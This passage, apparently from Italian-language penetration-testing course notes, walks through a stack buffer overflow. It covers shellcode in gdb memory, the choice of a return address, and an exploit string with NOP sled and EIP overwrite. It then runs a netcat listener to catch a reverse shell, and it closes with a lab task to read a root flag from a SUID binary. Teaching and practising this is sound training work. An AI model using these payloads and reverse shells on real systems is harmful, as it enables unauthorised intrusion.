                                                      # | ---> shellcode
0xffffd746:     0x19    0x43    0xda    0xc3    0xd9    0x74    0x24    0xf4
0xffffd74e:     0x5b    0x33    0xc9    0xb1    0x12    0x31    0x43    0x12
0xffffd756:     0x03    0x43    0x12    0x83    0xaa    0x99    0xfb    0xb6
0xffffd75e:     0x1d    0x79    0x0c    0xdb    0x0e    0x3e    0xa0    0x76

```

## Trovare l'indirizzo di ritorno

Dopo aver verificato che controlliamo ancora l'`EIP` con il nostro `shellcode`, ora abbiamo bisogno di un indirizzo di memoria in cui si trovano le nostre `NOP` per dire all'EIP di saltare ad esso. Questo indirizzo di memoria non deve contenere nessuno dei caratteri difettosi trovati in precedenza.

```shell
# individuiamo due punti:

# dove finiscono gli \x55 e iniziano gli \x90
# dove finiscono gli \x90 ed inizia lo shellcode

# scegliamo un indirizzo di memoria in questo intervallo

(gdb) x/2000xb $esp+1400

```

Dopo aver selezionato un indirizzo di memoria, sostituiamo il nostro "\x66" che sovrascrive l'EIP per dirgli di saltare all'indirizzo scelto, in questo esempio `0xffffd64c`. Si noti che l'inserimento dell'indirizzo viene fatto al contrario.

```shell
   Buffer = "\x55" * (1040 - 100 - 95 - 4) = 841

     NOPs = "\x90" * 100
Shellcode = "\xda\xca\xba...<SNIP>...\x5a\x22\xa2"
      EIP = "\x4c\xd6\xff\xff"
```

## Esecuzione

Poiché il nostro codice shell crea una shell inversa, lasciamo che `netcat` ascolti la porta `31337`.

```shell
$ nc -nlvp 31337

```

Dopo aver avviato `netcat`, eseguiamo nuovamente il nostro exploit adattato, che innesca la CPU per connettersi a `netcat`.

```shell
(gdb) run $(python -c 'print "\x55" * (1040 - 100 - 95 - 4) + "\x90" * 100 + "\xda\xca\xba...<SNIP>...\x5a\x22\xa2" + "\x4c\xd6\xff\xff"')
```

e nella shell con `netcat` abbiamo la connesione!

# Prevenzione

# Skill Assessment

Siamo riusciti a ottenere l'accesso SSH a una macchina Linux la cui password è stata riutilizzata da un'altra macchina durante il nostro test di penetrazione.

Su questa macchina, abbiamo un utente standard "htb-student" che può lasciare un messaggio all'amministratore utilizzando un programma scritto in proprio chiamato "leave_msg". Poiché l'azienda target presta molta attenzione alla difesa dall'esterno della rete e l'aspetto dell'amministratore mostrava un'elevata fiducia in se stesso, ciò potrebbe indicare che la sicurezza locale è stata trascurata.

Dopo le nostre ricerche, abbiamo scoperto che questi messaggi sono memorizzati in "/htb-student/msg.txt", che è binario di proprietà dell'utente root e il bit SUID è impostato.

Esaminate il programma e scoprite se è vulnerabile a un buffer overflow basato su stack. Se avete trovato la vulnerabilità, usatela per leggere il file "/root/flag.txt" presente nel sistema come prova.
